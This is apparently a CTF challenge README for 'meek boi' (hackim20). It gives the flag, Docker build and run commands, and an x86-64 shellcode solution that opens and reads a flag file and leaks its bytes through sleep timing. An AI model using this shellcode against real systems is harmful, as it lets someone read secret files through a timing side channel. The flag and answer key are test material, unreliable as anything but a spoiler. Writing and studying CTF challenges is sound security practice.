#### meek boi

##### Description

I don't talk, but I can be submissive

##### Points

150/200

##### Flag

hackim20{i_just_slept_all_the_way_with_you}

##### Solution

Use a shellcode like this to do a time based attack
```
push rbp
mov rbp, rsp
sub rsp, 0x100
mov rax, 0x101010101010101
push rax
mov rax, 0x101010101010101 ^ 0x67616c662f2e
xor [rsp], rax
mov rdi, rsp
xor edx, edx
xor esi, esi
mov rax, 2
syscall
xor eax, eax
mov rdi, 3
mov rdx, 9
inc edx
mov rsi, rsp
syscall
mov dil, byte ptr[rsp]
push 0
push rdi
mov rsi, rsp
mov rdi, rsp
mov rax, 0x23 
syscall
pop rax
pop rax
pop rax
leave
```

##### Build
```shell
docker build -t meek_boi .
```
##### Run:
```shell
docker run -p 5002:5002 meek_boi:latest
```

Notes:
Port is changeable. Change it in run command.
Change the flag to match the flag format.
